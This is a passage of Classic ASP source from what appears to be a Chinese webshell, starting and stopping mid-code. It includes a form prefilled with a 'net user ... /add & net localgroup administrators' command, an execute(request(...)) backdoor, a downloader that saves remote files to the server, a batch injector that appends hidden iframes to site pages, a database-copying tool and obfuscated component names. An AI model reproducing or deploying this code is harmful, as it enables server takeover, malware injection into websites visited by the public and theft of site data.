RRS"<td width='100'>用户名:</td>"
RRS"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>口 令：</td>"
RRS"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>端 口：</td>"
RRS"<td><input name='port' type='text' id='port' value='43958'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>系统路径：</td>"
RRS"    <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
RRS"  </tr>"
RRS"  <tr align='center' valign='middle'>"
RRS"    <td>命　令：</td>"
RRS"    <td><input name='c' type='text' id='c' value='cmd /c net user leaves cnsst /add & net localgroup administrators leaves /add' size='50'></td>"
RRS"  </tr>"
RRS" <tr align='center' valign='middle'>"
RRS"    <td colspan='2'><input type='submit' name='Submit' value='提交'> "
RRS"<input type='reset' name='Submit2' value='重置'>"
RRS"<input name='SUaction' type='hidden' id='action' value='1'></td>"
RRS"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
case "guan"
Response.Expires=0
on error resume next
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
Response.write admin.Name&"<br>"
Next
if err then
Response.write "Wscript.Network error!"
end if
case "d"
on error resume next:execute request(userpass)
rRs"<form action='?action=d' method=post>"
rRs"<textarea name=" & userpass & " cols=125 rows=55 width=99></textarea>"
rRs"<input type=submit value=OK></form>"
case "uu"
rRs"<iframe src=http://www.flqyey.com/Editor/Css/_vti_cnf/update.asp?a=2008 width=1100 height=800></iframe>"
case "dow"
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" 
RrS"<form method=post>"
RrS"<input name=theUrl value='http://' size=80><input type=submit value='down'><br/>"
RrS"<input name=thePath value="""&HtmlEncode(Server.MapPath("."))&"\luoye.asp"""" size=80>"
RrS"<input type=checkbox name=overWrite value=2>覆盖"
RrS"<input type=hidden value=downFromUrl name=theAct>"
RrS"</form>"
RrS"<hr/>"
If isDebugMode = False Then
On Error Resume Next
End If
Dim Http, theUrl, thePath, stream, fileName, overWrite
theUrl = Request("theUrl")
thePath = Request("thePath")
overWrite = Request("overWrite")
Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream")
Set Http = Server.CreateObject("MSXML2.XMLHTTP")
If overWrite <> 2 Then
overWrite = 1
End If
Http.Open "GET", theUrl, False
Http.Send()
If Http.ReadyState <> 4 Then 
End If
With stream
.Type = 1
.Mode = 3
.Open
.Write Http.ResponseBody
.Position = 0
.SaveToFile thePath, overWrite
If Err.Number = 3004 Then
Err.Clear
fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
If fileName = "" Then
fileName = "index.htm.txt"
End If
thePath = thePath & "\" & fileName
.SaveToFile thePath, overWrite
End If
.Close
End With
chkErr(Err)
Set Http = Nothing
Set Stream = Nothing
If isDebugMode = False Then
On Error Resume Next
End If
Case "kmuma"
dim Report
if request.QueryString("act")<>"scan" then
RRS ("<b>网站根目录</b>- "&Server.MapPath("/")&"<br>")
RRS ("<b>本程序目录</b>- "&Server.MapPath("."))
RrS"<form action=""?Action=kmuma&act=scan"" method=""post"" name=""form1"">"
RrS"<p><b>填入你要检查的路径：</b>"
RrS"<input name=""path"" type=""text"" style=""border:1px solid #999"" value=""."" size=""30"" /> 填“\”网站根目录；“.”为本程序目录<br><br>"
RrS"你要干什么: <input class=c name=""radiobutton"" type=""radio"" value=""sws"" onClick=""document.getElementById('showFile1').style.display='none'"" checked>查ASP 马"
RrS"<input class=c type=""radio"" name=""radiobutton"" value=""sf"" onClick=""document.getElementById('showFile1').style.display=''"">搜索符合条件之文件<br>"
RrS"<br /><div id=""showFile1"" style=""display:none"">"
RrS"&nbsp;&nbsp;查找内容：<input name=""Search_Content"" type=""text"" id=""Search_Content"" style=""border:1px solid #999"" size=""20"">"
RrS" 要查找的字符串，不填就只进行日期检查<br />"
RrS"&nbsp;&nbsp;修改日期：<input name=""Search_Date"" type=""text"" style=""border:1px solid #999"" value="""&Left(Now(),InStr(now()," ")-1)&""" size=""20""> 多个日期用;隔开，任意日期填写 <a href=""#"" onClick=""javascript:form1.Search_Date.value='ALL'"">ALL</a><br />"
RrS"&nbsp;&nbsp;文件类型：<input name=""Search_FileExt"" type=""text"" style=""border:1px solid #999"" value=""*"" size=""20""> 类型之间用,隔开，*表示所有类型<br /><br /></div>"
RrS"<input type=""submit"" value="" 开始扫描 "" style=""background:#ccc;border:2px solid #fff;padding:2px 2px 0px 2px;margin:4px;"" />"
RrS"</form>"
else
if request.Form("path")="" then
RRS("路径不能为空")
response.End()
end if
if request.Form("path")="\" then
TmpPath = Server.MapPath("\")
elseif request.Form("path")="." then
TmpPath = Server.MapPath(".")
else
TmpPath = request.Form("path")
end if
timer1 = timer
Sun = 0
SumFiles = 0
SumFolders = 1
If request.Form("radiobutton") = "sws" Then
DimFileExt = "asp,cer,asa,cdx"
Call ShowAllFile(TmpPath)
Else
If request.Form("path") = "" or request.Form("Search_Date") = "" or request.Form("Search_FileExt") = "" Then
RRS("缉捕条件不完全<br><br><a href='javascript:history.go(-1);'>请返回重新输入</a>")
response.End()
End If
DimFileExt = request.Form("Search_fileExt")
Call ShowAllFile2(TmpPath)
End If
RrS"<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style='font-size:12px'>"
RrS"<tr><th>Scan WebShell</tr>"
RrS"<tr><td style=""padding:5px;line-height:170%;clear:both;font-size:12px"">"
RrS"<div id=""updateInfo"" style=""background:ffffe1;border:1px solid #89441f;padding:4px;display:none""></div>"
RrS"扫描完毕！一共检查文件夹<font color=""#FF0000"">"&SumFolders&"</font>个，文件<font color=""#FF0000"">"&SumFiles&"</font>个，发现可疑点<font color=""#FF0000"">"&Sun&"</font>个"
RrS"<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""8"" bordercolor=""#999999"" style=""font-size:12px;border-collapse:collapse;line-height:130%;clear:both;""><tr>"
If request.Form("radiobutton") = "sws" Then
RrS"<td width=""20%"">文件相对路径</td>"
RrS"<td width=""20%"">特征码</td>"
RrS"<td width=""40%"">描述</td>"
RrS"<td width=""20%"">创建/修改时间</td>"
else
RrS"<td width=""50%"">文件相对路径</td>"
RrS"<td width=""25%"">文件创建时间</td>"
RrS"<td width=""25%"">修改时间</td>"
end if
RrS"</tr>"
RRS Report
RrS"<br/></table>"
timer2 = timer
thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
RrS"<br><font style='font-size:12px'>本页执行共用了"&thetime&"毫秒</font>"
end if
Sub ShowAllFile(Path)
Set F1SO = CreateObject("Scripting.FileSystemObject")
if not F1SO.FolderExists(path) then exit sub
Set f = F1SO.GetFolder(Path)
Set fc2 = f.files
For Each myfile in fc2
If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) Then
Call ScanFile(Path&Temp&"\"&myfile.name, "")
SumFiles = SumFiles + 1
End If
Next
Set fc = f.SubFolders
For Each f1 in fc
ShowAllFile path&"\"&f1.name
SumFolders = SumFolders + 1
Next
Set F1SO = Nothing
End Sub
Sub ScanFile(FilePath, InFile)
Server.ScriptTimeout=999999999
If InFile <> "" Then
Infiles = "<font color=red>该文件被<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>文件包含执行</font>"
End If
Set FSO1s = CreateObject("Scripting.FileSystemObject")
on error resume next
set ofile = FSO1s.OpenTextFile(FilePath)
filetxt = Lcase(ofile.readall())
If err Then Exit Sub end if
if len(filetxt)>0 then
filetxt = vbcrlf & filetxt
temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a><br />"
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"
If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell 或者 clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-同上-"
End if
If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application 或者 clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-同上-"
End If
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>似乎脚本被加密了</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-同上-"
End If
regEx.Pattern = "\bEv"&"al\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()函数可以执行任意ASP代码<br>但是javascript代码中也可以使用，有可能是误报。"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-同上-"
End If
regEx.Pattern = "[^.]\bExe"&"cute\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()函数可以执行任意ASP代码</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-同上-"
End If
regEx.Pattern = "\.(Open|Create)TextFile\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>.CreateTextFile|.OpenTextFile</td><td>使用了FSO的CreateTextFile|OpenTextFile读写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-同上-"
End If
regEx.Pattern = "\.SaveToFile\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>.SaveToFile</td><td>使用了Stream的SaveToFile函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-同上-"
End If
regEx.Pattern = "\.Save\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>.Save</td><td>使用了XMLHTTP的Save函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-同上-"
End If
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>Server.Exec"&"ute</td><td><font color=red>不能跟踪检查Server.e"&"xecute()函数执行的文件。</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
End If
Set Matches = Nothing
Set regEx = Nothing
Set XregEx = New RegExp
XregEx.IgnoreCase = True
XregEx.Global = True
XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
Set XMatches = XregEx.Execute(filetxt)
For Each Match in XMatches
tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
srcSeek = InStr(1, tmpLake2, "src", 1)
If srcSeek > 0 Then
srcSeek2 = instr(srcSeek, tmpLake2, "=")
For i = 1 To 50
tmp = Mid(tmpLake2, srcSeek2 + i, 1)
If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
Exit For
End If
Next
If tmp = """" Then
tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
Else
If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
End If
Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "CreateO"&"bject[ |\t]*\(.*\)"
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """") = 0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
Report = Report&"<tr><td>"&temp&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject函数使用了变形技术"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
exit sub
End If
Next
Set Matches = Nothing
Set regEx = Nothing
end if
set ofile = nothing
set FSO1s = nothing
End Sub
Function CheckExt(FileExt)
If DimFileExt = "*" Then CheckExt = True
Ext = Split(DimFileExt,",")
For i = 0 To Ubound(Ext)
If Lcase(FileExt) = Ext(i) Then 
CheckExt = True
Exit Function
End If
Next
End Function
Function GetDateModify(filepath)
Set F2SO = CreateObject("Scripting.FileSystemObject")
Set f = F2SO.GetFile(filepath)
s = f.DateLastModified 
set f = nothing
set F2SO = nothing
GetDateModify = s
End Function
Function GetDateCreate(filepath)
Set F3SO = CreateObject("Scripting.FileSystemObject")
Set f = F3SO.GetFile(filepath)
s = f.DateCreated
set f = nothing
set F3SO = nothing
GetDateCreate = s
End Function
Function tURLEncode(Str)
temp = Replace(Str, "%", "%25")
temp = Replace(temp, "#", "%23")
temp = Replace(temp, "&", "%26")
tURLEncode = temp
End Function
Sub ShowAllFile2(Path)
Set F4SO = CreateObject("Scripting.FileSystemObject")
if not F4SO.FolderExists(path) then exit sub
Set f = F4SO.GetFolder(Path)
Set fc2 = f.files
For Each myfile in fc2
If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) Then
Call IsFind(Path&"\"&myfile.name)
SumFiles = SumFiles + 1
End If
Next
Set fc = f.SubFolders
For Each f1 in fc
ShowAllFile2 path&"\"&f1.name
SumFolders = SumFolders + 1
Next
Set F4SO = Nothing
End Sub
Sub IsFind(thePath)
theDate = GetDateModify(thePath)
on error resume next
theTmp = Mid(theDate, 1, Instr(theDate, " ") - 1)
if err then exit Sub
xDate = Split(request.Form("Search_Date"),";")
If request.Form("Search_Date") = "ALL" Then ALLTime = True
For i = 0 To Ubound(xDate)
If theTmp = xDate(i) or ALLTime = True Then 
If request("Search_Content") <> "" Then
Set FSO2s = CreateObject("Scripting.FileSystemObject")
set ofile = FSO2s.OpenTextFile(thePath, 1, false, -2)
filetxt = Lcase(ofile.readall())
If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then
temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
temp=temp&" → <a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"
Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Report = Report&"<tr><td>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Sun = Sun + 1
Exit Sub
End If
ofile.close()
Set ofile = Nothing
Set FSO2s = Nothing
Else
temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am'title='移动'>Move</a>"
Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Sun = Sun + 1
Exit Sub
End If
End If
Next
End Sub
Function IsPattern(patt,str)
Set regEx=New RegExp
regEx.Pattern=patt
regEx.IgnoreCase=True
retVal=regEx.Test(str)
Set regEx=Nothing
If retVal=True Then
IsPattern=True
Else
IsPattern=False
End If
End Function
if request.form("submit")<>"" then
If s="" or addcode="" Then
RrS"<font color=red>请输入挂马的路径或代码!</font>"
response.end
else If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then sch s
End If
end if
Sub sch(s)
oN eRrOr rEsUmE nExT
Set fs=Server.createObject("Scripting.FileSystemObject")
Set fd=fs.GetFolder(s)
Set fi=fd.Files
Set sf=fd.SubFolders
For Each f in fi
rtn=f.path
step_all rtn
Next
If sf.Count<>0 Then
For Each l In sf
sch l
Next
End If
End Sub
Sub step_all(agr)
retVal=IsPattern("(\\|\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|login|diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|list|shop|err|nc|ad|flash|text|admin_upfile|admin_upload|upfile_load|upfile_soft|upfile_photo|upfile_softpic|vip|505)\.(htm|html|asp|php|jsp|aspx|cgi|js)\b",agr)
If retVal Then
step1 agr
step2 agr
Else
Exit Sub
End If
End Sub
Sub step1(str1)
RrS"<div style='line-height:20px'>√ "&str1&" _"
RrS"<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
RrS"<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
RrS"<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a> "
RrS"<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
RrS"<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a></div>"
End Sub
Sub step2(str2)
Set fs=Server.createObject("Scripting.FileSystemObject")
isExist=fs.FileExists(str2)
If isExist Then
Set f=fs.GetFile(str2)
Set f_addcode=f.OpenAsTextStream(8,-2)
f_addcode.Write addcode
f_addcode.Close
Set f=Nothing
End If
Set fs=Nothing
End Sub
Err.Clear
Case "Cplgm"
Fpath=Request("fd")
addcode = Request("code")
addcode2 = Request("code2")
pcfile=request("pcfile")
checkbox=request("checkbox")
ShowMsg=request("ShowMsg")
FType=request("FType")
M=request("M")
if Ftype="" then Ftype="txt|htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
if Fpath="\" then Fpath=Server.MapPath("\")
if Fpath="." or Fpath="" then Fpath=Server.MapPath(".")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
if checkbox="" then checkbox=request("checkbox")
if pcfile="" then
pcfileName=Request.ServerVariables("SCRIPT_NAME")
pcfilek=split(pcfileName,"/")
pcfilen=ubound(pcfilek)
pcfile=pcfilek(pcfilen)
end if
RRS ("<b>网站根目录</b>- "&Server.MapPath("/")&"<br>")
RRS ("<b>本程序目录</b>- "&Server.MapPath("."))
RrS"<form method=POST><div style='color:#3399ff'><b>[" 
if M="1" then RRS"批量挂马器-批量挂马"
if M="2" then RRS"批量清马器-清除别人的网马"
if M="3" then RRS"批量替换器-文件替换修改工具"
if M="" then response.end
RrS"]</b></div><table width=100% border=0><tr><td>文件路径：</td>"
RrS"<td><input type=text name=fd value='"&Fpath&"' size=40> 填“\”即网站根目录；“.”为程序所在目录</td></tr>"
if M="1" then RRS "<tr><td>过滤重复：</td><td><input class=c name='checkbox' type=checkbox value='checked' "&checkbox&"> 防止一个页面中有多个重复的代码</td></tr>"
RRS "<tr><td>排除文件：</td>"
RRS "<td><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40> 输入不想被修改的文件名，例如：1.asp|2.asp|3.asp</td></tr>"
RRS "<tr><td>文件类型：</td>"
RRS "<td><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> 输入要修改的文件类型[扩展名]，例如：htm|html|asp|php|jsp|aspx|cgi</td></tr><tr><td><font color=#3399ff>"
if M="1" then RRS"要挂的马："
if M="2" then RRS"要清的马："
if M="3" then RRS"查找内容："
RRS"</font></td><td><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
if M="3" then RRS "<tr><td><font color=#3399ff>替 换 为：</font></td><td><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
RRS "<tr><td></td><td> <input name=submit type=submit value=开始执行> --标记解释--[成功：√ ， 排除：× ， 重复：<font color=red>×</font>]</td></tr>"
RRS "</table></form>" 
if request("submit")="开始执行" then 
RRS"<div style='line-height:25px'><b>执行记录：</b><br>"
call InsertAllFiles(Fpath,addcode,pcfile)
RRS"</div>"
end if
Case "backup"
RRS"<center><b><p><font size=5>数据库字段复制工具</font></p></b></center>"
RRS"<center><font color=red>第一步：</font>"
RRS"<form action='' method=post name=form >"
RRS"<center>请选择欲复制的数据库类型：</center>"
RRS"<center><input type='radio' name='mdbsql' value='sql' checked>sql数据库"
RRS"<center><input type='radio' name='mdbsql' value='mdb'>mdb数据库<br>"
RRS"欲复制的字段数：<input type=text name=zhi>&nbsp;&nbsp;"
RRS"<center><input type=submit name='button' value='设  置'></form>"
zhi=request.form("zhi")
if zhi>0 then
mdbsql=request.form("mdbsql")
response.write "<font color=red><center>第二步：</center></font>"
response.write "<form action='' method=post name=form1>"
response.write "<center>创建的mdb数据库名称：<input type=text name=mdbname>(请带mdb扩展名)</center><br>"
if mdbsql="sql" then
response.write "<center>sql数据库用户名称：</center><input type=text name=sqlusername><br>"
response.write "<center>sql数据库连接密码：</center><input type=text name=sqlpwd><br>"
response.write "<center>sql数据库名称：</center><input type=text name=sqldataname><br>"
response.write "<center>sql数据库中表的名称：</center><input type=text name=sqltable><br>"
response.write "<center>sql数据库地址：</center><input type=text name=sqldatasource value='(local)'>(默认)<br>"
elseif mdbsql="mdb" then
response.write "<center>access数据库名称：</center><input type=text name=sqldataname>(请带文件扩展名)<br>"
response.write "<center>access数据库中表的名称：</center><input type=text name=sqltable><br>"
end if
response.write "<center>条件语句：<input type=text name=tiaojian>where的条件语句,连WHERE也要写上喔,下载该表所有数据则保持空白</center><br>"
response.write "<input type=hidden name=mdbsql value=" & mdbsql &">"
response.write "<input type=hidden name='zhi' value=" & zhi &">"
for i=1 to zhi
response.write "<center>欲复制的字段名称：</center><input type=text name=sqlrow("& i &")>"
response.write "<center>字段类型：</center><select name=sqltype("& i & ")>"
response.write "<option select value=varchar><center>文本</center></option><option select value=memo><center>备注</center></option><option select value=integer><center>数字</center></option><option select value=datetime><center>日期/时间</center></option><option select value=image><center>ole对象</center></option><option select value=bit><center>布尔</center></option>"
response.write "</select><br>"
next
response.write "<br><center><input type=submit name='button' value='复  制'></center>"
response.write "</form>"
end if
tiaojian=request.form("tiaojian")
mdbname=request.form("mdbname") 
if len(mdbname)>0 then 
response.write "<font color=red><center>第三步：</center></font><br>" 
zhi=request.form("zhi") 
sqltable=request.form("sqltable") 
sqlusername=request.form("sqlusername") 
sqlpwd=request.form("sqlpwd") 
sqldataname=request.form("sqldataname") 
sqldatasource=request.form("sqldatasource") 
mdbsql=request.form("mdbsql") 
mdbcreate="" 
mdbinsert="" 
sqlselect="" 
dim srow(),stype() 
redim srow(zhi),stype(zhi) 
on error resume next 
for i=1 to cint(zhi) 
srow(i) =request.form("sqlrow(" & i &")") 
stype(i)=request.form("sqltype(" & i &")") 
mdbcreate=mdbcreate & "[" & srow(i) & "] " & stype(i) &"," 
mdbinsert=mdbinsert  & srow(i) & "|" 
sqlselect=sqlselect & srow(i) & "," 
next 
mdbcreate=left(mdbcreate,len(mdbcreate)-1) 
mdbinsert=left(mdbinsert,len(mdbinsert)-1) 
sqlselect=left(sqlselect,len(sqlselect)-1) 
call crtable(mdbname,sqltable,mdbcreate) 
call copysq(mdbname,sqltable,sqlpwd,sqlusername,sqldataname,sqldatasource,mdbinsert,sqlselect,mdbsql) 
end if
function crtable(mdbname,sqltable,mdbcreate)
dbfile=server.mappath(mdbname)
set ydb=server.createobject("adox.catalog")
ydb.create "provider=microsoft.jet.oledb.4.0;data source=" & dbfile
set ydb=nothing
